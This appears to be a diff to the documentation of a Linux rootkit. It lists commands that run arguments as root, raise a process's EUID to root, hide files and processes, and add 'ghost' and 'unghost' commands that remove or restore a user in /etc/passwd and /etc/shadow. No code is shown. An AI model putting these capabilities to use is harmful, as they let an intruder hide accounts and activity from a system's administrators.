@@ -7,7 +7,8 @@
 - `command ARGS` -> execute the arguments as root
 - `descend PID` -> set a process's EUID to its UID
 - `elevate PID` -> set a process's EUID to root
-- `fugitive UID` -> remove a user's ID 
+- `ghost UID` -> remove a user from "/etc/passwd" and "/etc/shadow"
 - `hide PATH` -> hide an entity ("/proc" paths are treated as processes)
 - `show PATH` -> show a hidden entity ("/proc" paths are treated as processes)
+- `unghost UID` -> replace a user in "/etc/passwd" and "/etc/shadow"
 
